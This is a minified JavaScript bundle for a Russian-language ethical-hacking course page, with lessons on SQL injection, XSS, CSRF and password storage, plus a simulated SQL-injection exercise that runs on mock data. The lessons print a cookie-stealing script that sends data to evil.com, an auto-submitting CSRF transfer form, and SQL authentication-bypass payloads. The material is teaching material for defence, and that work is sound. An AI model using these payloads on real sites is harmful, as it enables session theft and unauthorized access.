(globalThis.TURBOPACK||(globalThis.TURBOPACK=[])).push(["object"==typeof document?document.currentScript:void 0,40115,e=>{"use strict";let t=[{id:1,title:"Введение в этичный хакинг",description:"Что такое этичный хакинг и почему это важно",category:"hacking",difficulty:"beginner",duration:15,content:`
# Введение в этичный хакинг

Этичный хакинг — это практика взлома компьютерных систем с целью обнаружения уязвимостей до того, как их найдут злоумышленники.

## Основные принципы:
- **Разрешение** — всегда получайте письменное разрешение перед тестированием
- **Законность** — действуйте в рамках закона
- **Конфиденциальность** — не разглашайте найденные уязвимости
- **Ответственность** — сообщайте о найденных проблемах владельцам

## Типы хакеров:
- 🟢 **White Hat** — этичные хакеры, защищающие системы
- 🔴 **Black Hat** — злоумышленники
- 🟡 **Gray Hat** — действуют без разрешения, но без злого умысла
    `,isCompleted:!1},{id:2,title:"SQL-инъекции",description:"Научитесь находить и предотвращать SQL-уязвимости",category:"hacking",difficulty:"beginner",duration:30,content:`
# SQL-инъекции

SQL-инъекция — это атака, при которой злоумышленник может выполнить произвольный SQL-код в базе данных.

## Как это работает:

1. Злоумышленник вводит специальный код в поле ввода
2. Этот код объединяется с SQL-запросом
3. База данных выполняет изменённый запрос

## Пример уязвимости:

\`\`\`sql
-- Уязвимый код
SELECT * FROM users WHERE username = '\${username}' AND password = '\${password}'
\`\`\`

## Пример атаки:

Если в поле username ввести: \`admin' --\`

Запрос станет:
\`\`\`sql
SELECT * FROM users WHERE username = 'admin' --' AND password = '...'
\`\`\`

Часть после -- игнорируется, и злоумышленник входит как admin!

## Защита:
- Используйте параметризованные запросы
- Валидируйте все входные данные
- Применяйте принцип минимальных привилегий
    `,isCompleted:!1},{id:3,title:"XSS-атаки",description:"Cross-Site Scripting — как защитить сайт от внедрения скриптов",category:"hacking",difficulty:"intermediate",duration:25,content:`
# XSS-атаки (Cross-Site Scripting)

XSS — это уязвимость, позволяющая злоумышленнику внедрить вредоносный JavaScript-код на страницу.

## Типы XSS:

### 1. Reflected XSS
Вредоносный скрипт приходит в запросе и сразу выполняется

### 2. Stored XSS
Скрипт сохраняется на сервере (в комментариях, сообщениях)

### 3. DOM-based XSS
Уязвимость в клиентском JavaScript-коде

## Пример атаки:

Злоумышленник оставляет комментарий:
\`\`\`html
<script>document.location='https://evil.com/steal?cookie='+document.cookie</script>
\`\`\`

## Защита:
- Экранируйте все выходные данные
- Используйте Content Security Policy (CSP)
- Валидируйте входные данные
- Используйте современные фреймворки (React, Vue)
    `,isCompleted:!1},{id:4,title:"CSRF-атаки",description:"Cross-Site Request Forgery — подделка запросов",category:"hacking",difficulty:"intermediate",duration:20,content:`
# CSRF-атаки (Cross-Site Request Forgery)

CSRF — это атака, при которой злоумышленник заставляет пользователя выполнить нежелательное действие на сайте, где он аутентифицирован.

## Как это работает:

1. Пользователь авторизован на сайте банка
2. Злоумышленник создаёт форму на своём сайте
3. Пользователь посещает сайт злоумышленника
4. Форма автоматически отправляет запрос в банк

## Пример:

\`\`\`html
<!-- Форма злоумышленника -->
<form action="https://bank.com/transfer" method="POST">
  <input type="hidden" name="to" value="evil-account">
  <input type="hidden" name="amount" value="10000">
</form>
<script>document.forms[0].submit()</script>
\`\`\`

## Защита:
- Используйте CSRF-токены
- Проверяйте заголовок Origin/Referer
- Требуйте повторной аутентификации для важных операций
- Используйте SameSite cookie
    `,isCompleted:!1},{id:5,title:"Безопасность паролей",description:"Хеширование, соль и лучшие практики",category:"hacking",difficulty:"beginner",duration:20,content:`
# Безопасность паролей

## Почему пароли важны?

Пароли — первая линия защиты аккаунта.

## Плохие практики:
- ❌ Пароль: 123456
- ❌ Пароль: password
- ❌ Один пароль для всех сайтов
- ❌ Хранение паролей в открытом виде

## Хорошие практики:
- ✅ Минимум 12 символов
- ✅ Комбинация букв, цифр, символов
- ✅ Уникальный пароль для каждого сайта
- ✅ Использование менеджера паролей
- ✅ Двухфакторная аутентификация

## Хеширование:

Пароли должны храниться в захешированном виде:

\`\`\`
password → bcrypt → $2b$10$N9qo8uLOickgx2ZMRZoMye...
\`\`\`

## Алгоритмы:
- ✅ bcrypt (рекомендуется)
- ✅ Argon2 (современный)
- ✅ scrypt
- ❌ MD5 (устарел)
- ❌ SHA1 (устарел)
    `,isCompleted:!1}],s=async()=>t,i=async e=>t.find(t=>t.id===e)||null;e.s(["getLessonById",0,i,"getLessons",0,s])},88653,e=>{"use strict";e.i(47167);var t=e.i(43476),s=e.i(71645),i=e.i(31178),r=e.i(47414),n=e.i(74008),a=e.i(21476),l=e.i(72846),o=s,d=e.i(37806);function c(e,t){if("function"==typeof e)return e(t);null!=e&&(e.current=t)}class m extends o.Component{getSnapshotBeforeUpdate(e){let t=this.props.childRef.current;if(t&&e.isPresent&&!this.props.isPresent&&!1!==this.props.pop){let e=t.offsetParent,s=(0,l.isHTMLElement)(e)&&e.offsetWidth||0,i=(0,l.isHTMLElement)(e)&&e.offsetHeight||0,r=this.props.sizeRef.current;r.height=t.offsetHeight||0,r.width=t.offsetWidth||0,r.top=t.offsetTop,r.left=t.offsetLeft,r.right=s-r.width-r.left,r.bottom=i-r.height-r.top}return null}componentDidUpdate(){}render(){return this.props.children}}function u({children:e,isPresent:i,anchorX:r,anchorY:n,root:a,pop:l}){let u=(0,o.useId)(),h=(0,o.useRef)(null),x=(0,o.useRef)({width:0,height:0,top:0,left:0,right:0,bottom:0}),{nonce:p}=(0,o.useContext)(d.MotionConfigContext),g=function(...e){return s.useCallback(function(...e){return t=>{let s=!1,i=e.map(e=>{let i=c(e,t);return s||"function"!=typeof i||(s=!0),i});if(s)return()=>{for(let t=0;t<i.length;t++){let s=i[t];"function"==typeof s?s():c(e[t],null)}}}}(...e),e)}(h,e.props?.ref??e?.ref);return(0,o.useInsertionEffect)(()=>{let{width:e,height:t,top:s,left:o,right:d,bottom:c}=x.current;if(i||!1===l||!h.current||!e||!t)return;let m="left"===r?`left: ${o}`:`right: ${d}`,g="bottom"===n?`bottom: ${c}`:`top: ${s}`;h.current.dataset.motionPopId=u;let f=document.createElement("style");p&&(f.nonce=p);let b=a??document.head;return b.appendChild(f),f.sheet&&f.sheet.insertRule(`
          [data-motion-pop-id="${u}"] {
            position: absolute !important;
            width: ${e}px !important;
            height: ${t}px !important;
            ${m}px !important;
            ${g}px !important;
          }
        `),()=>{b.contains(f)&&b.removeChild(f)}},[i]),(0,t.jsx)(m,{isPresent:i,childRef:h,sizeRef:x,pop:l,children:!1===l?e:o.cloneElement(e,{ref:g})})}let h=({children:e,initial:i,isPresent:n,onExitComplete:l,custom:o,presenceAffectsLayout:d,mode:c,anchorX:m,anchorY:h,root:p})=>{let g=(0,r.useConstant)(x),f=(0,s.useId)(),b=!0,y=(0,s.useMemo)(()=>(b=!1,{id:f,initial:i,isPresent:n,custom:o,onExitComplete:e=>{for(let t of(g.set(e,!0),g.values()))if(!t)return;l&&l()},register:e=>(g.set(e,!1),()=>g.delete(e))}),[n,g,l]);return d&&b&&(y={...y}),(0,s.useMemo)(()=>{g.forEach((e,t)=>g.set(t,!1))},[n]),s.useEffect(()=>{n||g.size||!l||l()},[n]),e=(0,t.jsx)(u,{pop:"popLayout"===c,isPresent:n,anchorX:m,anchorY:h,root:p,children:e}),(0,t.jsx)(a.PresenceContext.Provider,{value:y,children:e})};function x(){return new Map}var p=e.i(64978);let g=e=>e.key||"";function f(e){let t=[];return s.Children.forEach(e,e=>{(0,s.isValidElement)(e)&&t.push(e)}),t}let b=({children:e,custom:a,initial:l=!0,onExitComplete:o,presenceAffectsLayout:d=!0,mode:c="sync",propagate:m=!1,anchorX:u="left",anchorY:x="top",root:b})=>{let[y,j]=(0,p.usePresence)(m),N=(0,s.useMemo)(()=>f(e),[e]),E=m&&!y?[]:N.map(g),S=(0,s.useRef)(!0),v=(0,s.useRef)(N),w=(0,r.useConstant)(()=>new Map),C=(0,s.useRef)(new Set),[R,L]=(0,s.useState)(N),[O,T]=(0,s.useState)(N);(0,n.useIsomorphicLayoutEffect)(()=>{S.current=!1,v.current=N;for(let e=0;e<O.length;e++){let t=g(O[e]);E.includes(t)?(w.delete(t),C.current.delete(t)):!0!==w.get(t)&&w.set(t,!1)}},[O,E.length,E.join("-")]);let k=[];if(N!==R){let e=[...N];for(let t=0;t<O.length;t++){let s=O[t],i=g(s);E.includes(i)||(e.splice(t,0,s),k.push(s))}return"wait"===c&&k.length&&(e=k),T(f(e)),L(N),null}let{forceRender:M}=(0,s.useContext)(i.LayoutGroupContext);return(0,t.jsx)(t.Fragment,{children:O.map(e=>{let s=g(e),i=(!m||!!y)&&(N===O||E.includes(s));return(0,t.jsx)(h,{isPresent:i,initial:(!S.current||!!l)&&void 0,custom:a,presenceAffectsLayout:d,mode:c,root:b,onExitComplete:i?void 0:()=>{if(C.current.has(s)||(C.current.add(s),!w.has(s)))return;w.set(s,!0);let e=!0;w.forEach(t=>{t||(e=!1)}),e&&(M?.(),T(v.current),m&&j?.(),o&&o())},anchorX:u,anchorY:x,children:e},s)})})};e.s(["AnimatePresence",()=>b],88653)},20659,e=>{"use strict";var t=e.i(43476);let s=({className:e="",width:s,height:i,rounded:r="md",variant:n="text"})=>{let a=`
    animate-pulse
    bg-gray-200
    ${{sm:"rounded-sm",md:"rounded",lg:"rounded-lg",full:"rounded-full"}[r]}
    ${"circular"===n?"rounded-full":""}
    ${e}
  `,l={};return s&&(l.width="number"==typeof s?`${s}px`:s),i&&(l.height="number"==typeof i?`${i}px`:i),(0,t.jsx)("div",{className:a,style:l})},i=({lines:e=3,spacing:i="md",className:r=""})=>(0,t.jsx)("div",{className:`${{sm:"space-y-1",md:"space-y-2",lg:"space-y-3"}[i]} ${r}`,children:Array.from({length:e}).map((i,r)=>(0,t.jsx)(s,{height:"1rem",className:r===e-1?"w-3/4":""},r))});e.s(["SkeletonCard",0,({className:e=""})=>(0,t.jsxs)("div",{className:`bg-white rounded-lg shadow-md p-6 animate-pulse ${e}`,children:[(0,t.jsxs)("div",{className:"flex items-center justify-between mb-4",children:[(0,t.jsx)(s,{height:"1.5rem",width:"60%",className:"rounded"}),(0,t.jsx)(s,{height:"1.5rem",width:"20%",rounded:"full"})]}),(0,t.jsx)(i,{lines:2,spacing:"sm"}),(0,t.jsxs)("div",{className:"flex items-center justify-between mt-4",children:[(0,t.jsx)(s,{height:"1rem",width:"30%"}),(0,t.jsx)(s,{height:"1rem",width:"20%"})]})]}),"SkeletonHeader",0,({className:e=""})=>(0,t.jsxs)("div",{className:`space-y-4 ${e}`,children:[(0,t.jsx)(s,{height:"2.5rem",width:"75%",className:"rounded"}),(0,t.jsx)(s,{height:"1.5rem",width:"50%",className:"rounded"})]})])},20650,e=>{"use strict";var t=e.i(43476),s=e.i(71645),i=e.i(46932),r=e.i(88653);let n=[{id:1,name:"admin",email:"admin@example.com",password:"hashed_password_1"},{id:2,name:"user1",email:"user1@example.com",password:"hashed_password_2"},{id:3,name:"user2",email:"user2@example.com",password:"hashed_password_3"}],a=[{id:1,name:"Ноутбук",price:5e4},{id:2,name:"Смартфон",price:3e4},{id:3,name:"Планшет",price:2e4}];e.s(["default",0,({onComplete:e})=>{let[l,o]=(0,s.useState)("SELECT * FROM users WHERE id = 1"),[d,c]=(0,s.useState)(null),[m,u]=(0,s.useState)(1),[h,x]=(0,s.useState)(0),p=()=>{c(null),x(0),o(1===m?"SELECT * FROM users WHERE id = 1":2===m?"SELECT * FROM users WHERE id = '1'":"SELECT * FROM users WHERE name = ''")},g=[{title:"Уровень 1: Получение данных",description:"Напишите SQL-запрос для получения пользователя с id=1"},{title:"Уровень 2: UNION-атака",description:"Используйте UNION для получения данных из другой таблицы"},{title:"Уровень 3: Обход аутентификации",description:"Обойдите проверку логина с помощью SQL-инъекции"}];return(0,t.jsxs)("div",{className:"bg-white rounded-lg shadow-lg p-6 max-w-4xl mx-auto",children:[(0,t.jsx)("h2",{className:"text-2xl font-bold text-gray-800 mb-2",children:"🔓 Симулятор SQL-инъекции"}),(0,t.jsx)("p",{className:"text-gray-600 mb-6",children:"Научитесь находить и эксплуатировать SQL-уязвимости в безопасной среде"}),(0,t.jsxs)("div",{className:"mb-6",children:[(0,t.jsxs)("div",{className:"flex justify-between items-center mb-2",children:[(0,t.jsx)("span",{className:"text-sm font-medium text-gray-700",children:"Прогресс"}),(0,t.jsxs)("span",{className:"text-sm text-gray-600",children:["Уровень ",m," из 3"]})]}),(0,t.jsx)("div",{className:"w-full bg-gray-200 rounded-full h-2",children:(0,t.jsx)(i.motion.div,{className:"bg-blue-600 h-2 rounded-full",initial:{width:0},animate:{width:`${m/3*100}%`},transition:{duration:.5}})})]}),(0,t.jsxs)(i.motion.div,{initial:{opacity:0,y:-10},animate:{opacity:1,y:0},className:"bg-blue-50 border border-blue-200 rounded-lg p-4 mb-6",children:[(0,t.jsx)("h3",{className:"font-semibold text-blue-800",children:g[m-1].title}),(0,t.jsx)("p",{className:"text-blue-700 text-sm mt-1",children:g[m-1].description})]},m),(0,t.jsxs)("div",{className:"mb-4",children:[(0,t.jsx)("label",{className:"block text-sm font-medium text-gray-700 mb-2",children:"Ваш SQL-запрос:"}),(0,t.jsxs)("div",{className:"relative",children:[(0,t.jsx)("input",{type:"text",value:l,onChange:e=>o(e.target.value),className:"w-full px-4 py-3 font-mono text-sm bg-gray-900 text-green-400 rounded-lg border border-gray-700 focus:outline-none focus:ring-2 focus:ring-blue-500",placeholder:"Введите SQL-запрос..."}),(0,t.jsx)("div",{className:"absolute right-3 top-1/2 transform -translate-y-1/2 text-gray-500 text-xs",children:"SQL"})]})]}),(0,t.jsxs)("div",{className:"flex gap-3 mb-6",children:[(0,t.jsx)("button",{onClick:()=>{x(e=>e+1);let e=l.trim().toUpperCase(),t={success:!1,message:"❌ Неверный запрос.",hint:"Попробуйте ещё раз"};1===m?t=e.includes("SELECT")&&e.includes("FROM USERS")?e.includes("DROP")||e.includes("DELETE")?{success:!1,message:"⚠️ Опасная операция! Попробуйте просто получить данные.",hint:"Используйте SELECT * FROM users WHERE id = 1 для получения пользователя с id=1"}:e.includes("WHERE")&&e.includes("ID = 1")?{success:!0,message:"✅ Успех! Вы получили пользователя с id=1.",data:[n[0]]}:e.includes("WHERE")?{success:!1,message:"📝 Запрос выполнен, но попробуйте получить именно пользователя с id=1.",hint:"Используйте: SELECT * FROM users WHERE id = 1"}:{success:!1,message:"📝 Этот запрос вернёт всех пользователей, а нужно получить только с id=1.",hint:"Добавьте условие: WHERE id = 1"}:{success:!1,message:"❌ Неверный запрос. Попробуйте ещё раз.",hint:"Используйте: SELECT * FROM users WHERE id = 1"}:2===m?t=e.includes("UNION")&&(e.includes("SELECT * FROM PRODUCTS")||e.includes("SELECT * FROM users"))?{success:!0,message:"🎉 Отлично! Вы использовали UNION для объединения результатов!",data:[...n,...a.map(e=>({id:e.id,name:e.name,email:`Product: ${e.name}`}))]}:e.includes("UNION")&&e.includes("SELECT")?{success:!1,message:"📝 UNION используется, но нужно получить данные из таблицы products.",hint:"Попробуйте: SELECT * FROM users UNION SELECT * FROM products"}:e.includes("SELECT")?{success:!1,message:"📝 Обычный запрос работает, но попробуйте найти уязвимость!",hint:"Попробуйте использовать: UNION SELECT для получения данных из другой таблицы"}:{success:!1,message:"❌ Неверный запрос.",hint:"Попробуйте: SELECT * FROM users UNION SELECT * FROM products"}:3===m&&(t=e.includes("' OR '1'='1")||e.includes("' OR 1=1")?{success:!0,message:"🔓 Взлом успешен! Вы обошли аутентификацию!",data:n}:e.includes("SELECT")?{success:!1,message:"📝 Запрос выполнен, но аутентификация не обойдена.",hint:"Попробуйте: ' OR '1'='1 в условии WHERE"}:{success:!1,message:"❌ Неверный запрос.",hint:"Используйте уязвимость: ' OR '1'='1"}),c(t),t.success},className:"flex-1 bg-blue-600 hover:bg-blue-700 text-white font-semibold py-3 px-6 rounded-lg transition-colors",children:"Выполнить запрос"}),(0,t.jsx)("button",{onClick:p,className:"px-6 py-3 border border-gray-300 text-gray-700 hover:bg-gray-50 rounded-lg transition-colors",children:"Сбросить"})]}),(0,t.jsx)(r.AnimatePresence,{children:d&&(0,t.jsxs)(i.motion.div,{initial:{opacity:0,y:20},animate:{opacity:1,y:0},exit:{opacity:0,y:-20},className:`rounded-lg p-4 ${d.success?"bg-green-50 border border-green-200":"bg-red-50 border border-red-200"}`,children:[(0,t.jsx)("p",{className:`font-semibold mb-2 ${d.success?"text-green-800":"text-red-800"}`,children:d.message}),d.hint&&(0,t.jsxs)("p",{className:"text-sm text-gray-600 mb-3",children:["💡 Подсказка: ",d.hint]}),d.data&&(0,t.jsx)("div",{className:"bg-white rounded border overflow-hidden",children:(0,t.jsx)("div",{className:"overflow-x-auto",children:(0,t.jsxs)("table",{className:"min-w-full text-sm",children:[(0,t.jsx)("thead",{className:"bg-gray-50",children:(0,t.jsx)("tr",{children:Object.keys(d.data[0]).map(e=>(0,t.jsx)("th",{className:"px-4 py-2 text-left text-gray-700 font-medium uppercase",children:e},e))})}),(0,t.jsx)("tbody",{children:d.data.slice(0,5).map((e,s)=>(0,t.jsx)("tr",{className:"border-t",children:Object.entries(e).map(([e,s])=>(0,t.jsx)("td",{className:"px-4 py-2 text-gray-600",children:String(s)},e))},s))})]})})}),d.success&&m<3&&(0,t.jsxs)("div",{className:"mt-4 flex gap-3",children:[(0,t.jsx)("button",{onClick:()=>{m<3&&(u(e=>e+1),c(null),x(0),1===m?o("SELECT * FROM users WHERE id = '1'"):2===m&&o("SELECT * FROM users WHERE name = ''"))},className:"bg-green-600 hover:bg-green-700 text-white font-semibold py-2 px-6 rounded-lg transition-colors",children:"Следующий уровень →"}),(0,t.jsx)("button",{onClick:p,className:"bg-gray-200 hover:bg-gray-300 text-gray-700 font-semibold py-2 px-6 rounded-lg transition-colors",children:"Заново"})]}),d.success&&3===m&&(0,t.jsxs)("div",{className:"mt-4",children:[(0,t.jsx)("p",{className:"text-green-800 font-semibold",children:"🎉 Поздравляем! Вы прошли все уровни симулятора!"}),(0,t.jsx)("button",{onClick:()=>{u(1),c(null),x(0),o("SELECT * FROM users WHERE id = 1")},className:"mt-3 bg-green-600 hover:bg-green-700 text-white font-semibold py-2 px-6 rounded-lg transition-colors",children:"Начать заново"})]})]})}),h>0&&(0,t.jsxs)("div",{className:"mt-4 text-sm text-gray-500 text-center",children:["Попыток: ",h]}),(0,t.jsxs)("div",{className:"mt-8 pt-6 border-t",children:[(0,t.jsx)("h4",{className:"font-semibold text-gray-700 mb-3",children:"📚 Справочник:"}),(0,t.jsxs)("div",{className:"grid grid-cols-1 md:grid-cols-2 gap-4 text-sm",children:[(0,t.jsxs)("div",{className:"bg-gray-50 p-3 rounded",children:[(0,t.jsx)("p",{className:"font-mono text-blue-600",children:"SELECT * FROM table"}),(0,t.jsx)("p",{className:"text-gray-600 mt-1",children:"Получить все данные из таблицы"})]}),(0,t.jsxs)("div",{className:"bg-gray-50 p-3 rounded",children:[(0,t.jsx)("p",{className:"font-mono text-blue-600",children:"UNION SELECT"}),(0,t.jsx)("p",{className:"text-gray-600 mt-1",children:"Объединить результаты запросов"})]}),(0,t.jsxs)("div",{className:"bg-gray-50 p-3 rounded",children:[(0,t.jsx)("p",{className:"font-mono text-blue-600",children:"' OR '1'='1"}),(0,t.jsx)("p",{className:"text-gray-600 mt-1",children:"Обход условия WHERE"})]}),(0,t.jsxs)("div",{className:"bg-gray-50 p-3 rounded",children:[(0,t.jsx)("p",{className:"font-mono text-blue-600",children:"-- (комментарий)"}),(0,t.jsx)("p",{className:"text-gray-600 mt-1",children:"Игнорировать остальную часть запроса"})]})]})]})]})}])},98302,e=>{"use strict";var t=e.i(43476),s=e.i(71645),i=e.i(22016),r=e.i(46932),n=e.i(20650),a=e.i(20659),l=e.i(40115);e.s(["default",0,()=>{let[e,o]=(0,s.useState)([]),[d,c]=(0,s.useState)(!0),[m,u]=(0,s.useState)("theory");return(0,s.useEffect)(()=>{(async()=>{try{let e=await (0,l.getLessons)();o(e)}catch(e){console.error("Ошибка при загрузке уроков:",e)}finally{c(!1)}})()},[]),(0,t.jsx)("div",{className:"min-h-screen bg-gradient-to-b from-blue-50 to-white",children:(0,t.jsxs)("div",{className:"container mx-auto px-4 py-12",children:[(0,t.jsxs)(r.motion.div,{initial:{opacity:0,y:-20},animate:{opacity:1,y:0},className:"text-center mb-12",children:[(0,t.jsx)("h1",{className:"text-4xl md:text-5xl font-bold text-gray-800 mb-4",children:"🔐 Уязвимости сайтов"}),(0,t.jsx)("p",{className:"text-xl text-gray-600 max-w-3xl mx-auto",children:"Изучите основные типы веб-уязвимостей и научитесь находить их в безопасной среде"})]}),(0,t.jsx)("div",{className:"flex justify-center mb-8",children:(0,t.jsxs)("div",{className:"bg-white rounded-lg shadow-md p-2 inline-flex",children:[(0,t.jsx)("button",{onClick:()=>u("theory"),className:`px-6 py-3 rounded-md font-semibold transition-colors ${"theory"===m?"bg-blue-600 text-white":"text-gray-700 hover:bg-gray-100"}`,children:"📚 Теория"}),(0,t.jsx)("button",{onClick:()=>u("practice"),className:`px-6 py-3 rounded-md font-semibold transition-colors ${"practice"===m?"bg-blue-600 text-white":"text-gray-700 hover:bg-gray-100"}`,children:"💻 Практика"})]})}),"theory"===m?(0,t.jsx)(r.motion.div,{initial:{opacity:0},animate:{opacity:1},className:"max-w-5xl mx-auto",children:d?(0,t.jsxs)("div",{className:"grid gap-6",children:[(0,t.jsx)(a.SkeletonHeader,{}),(0,t.jsx)(a.SkeletonCard,{}),(0,t.jsx)(a.SkeletonCard,{}),(0,t.jsx)(a.SkeletonCard,{})]}):(0,t.jsx)("div",{className:"grid gap-6",children:e.map((e,s)=>(0,t.jsx)(r.motion.div,{initial:{opacity:0,y:20},animate:{opacity:1,y:0},transition:{delay:.1*s},className:"bg-white rounded-lg shadow-md hover:shadow-lg transition-shadow overflow-hidden",children:(0,t.jsxs)("div",{className:"p-6",children:[(0,t.jsxs)("div",{className:"flex items-start justify-between mb-4",children:[(0,t.jsxs)("div",{className:"flex-1",children:[(0,t.jsx)("h2",{className:"text-2xl font-bold text-gray-800 mb-2",children:e.title}),(0,t.jsx)("p",{className:"text-gray-600 mb-4",children:e.description})]}),(0,t.jsx)("span",{className:`px-3 py-1 rounded-full text-sm font-medium ${(e=>{switch(e){case"beginner":return"bg-green-100 text-green-800";case"intermediate":return"bg-yellow-100 text-yellow-800";case"advanced":return"bg-red-100 text-red-800";default:return"bg-gray-100 text-gray-800"}})(e.difficulty)}`,children:(e=>{switch(e){case"beginner":return"Начинающий";case"intermediate":return"Средний";case"advanced":return"Продвинутый";default:return e}})(e.difficulty)})]}),(0,t.jsxs)("div",{className:"flex items-center justify-between",children:[(0,t.jsx)("div",{className:"flex items-center space-x-4 text-sm text-gray-500",children:(0,t.jsxs)("span",{className:"flex items-center",children:[(0,t.jsx)("svg",{className:"w-4 h-4 mr-1",fill:"none",stroke:"currentColor",viewBox:"0 0 24 24",children:(0,t.jsx)("path",{strokeLinecap:"round",strokeLinejoin:"round",strokeWidth:2,d:"M12 8v4l3 3m6-3a9 9 0 11-18 0 9 9 0 0118 0z"})}),e.duration," мин"]})}),(0,t.jsx)(i.default,{href:`/hacking-lesson?id=${e.id}`,className:"text-blue-600 hover:text-blue-700 font-semibold",children:"Читать →"})]})]})},e.id))})}):(0,t.jsxs)(r.motion.div,{initial:{opacity:0},animate:{opacity:1},children:[(0,t.jsxs)("div",{className:"text-center mb-8",children:[(0,t.jsx)("h2",{className:"text-2xl font-bold text-gray-800 mb-2",children:"💻 Практикум: SQL-инъекции"}),(0,t.jsx)("p",{className:"text-gray-600",children:"Научитесь находить и эксплуатировать SQL-уязвимости в безопасной среде"})]}),(0,t.jsx)(n.default,{}),(0,t.jsx)("div",{className:"max-w-4xl mx-auto mt-12",children:(0,t.jsxs)("div",{className:"bg-yellow-50 border border-yellow-200 rounded-lg p-6",children:[(0,t.jsx)("h3",{className:"font-bold text-yellow-800 mb-2",children:"⚠️ Важное предупреждение"}),(0,t.jsx)("p",{className:"text-yellow-700 text-sm",children:"Все навыки, полученные здесь, должны использоваться только в образовательных целях и только на системах, на которые у вас есть письменное разрешение владельца. Несанкционированный доступ к компьютерным системам является преступлением."})]})})]}),(0,t.jsxs)(r.motion.div,{initial:{opacity:0,y:40},animate:{opacity:1,y:0},transition:{delay:.3},className:"mt-16",children:[(0,t.jsx)("h2",{className:"text-3xl font-bold text-center text-gray-800 mb-8",children:"Темы раздела"}),(0,t.jsx)("div",{className:"grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-6",children:[{icon:"💉",title:"SQL-инъекции",description:"Внедрение вредоносного SQL-кода",color:"from-red-500 to-red-600"},{icon:"🎭",title:"XSS",description:"Межсайтовый скриптинг",color:"from-orange-500 to-orange-600"},{icon:"🔄",title:"CSRF",description:"Подделка межсайтовых запросов",color:"from-yellow-500 to-yellow-600"},{icon:"🔑",title:"Пароли",description:"Безопасность аутентификации",color:"from-green-500 to-green-600"}].map((e,s)=>(0,t.jsxs)(r.motion.div,{whileHover:{scale:1.05},className:`bg-gradient-to-br ${e.color} rounded-lg p-6 text-white shadow-lg cursor-pointer`,children:[(0,t.jsx)("div",{className:"text-4xl mb-3",children:e.icon}),(0,t.jsx)("h3",{className:"text-xl font-bold mb-2",children:e.title}),(0,t.jsx)("p",{className:"text-sm opacity-90",children:e.description})]},e.title))})]})]})})}])}]);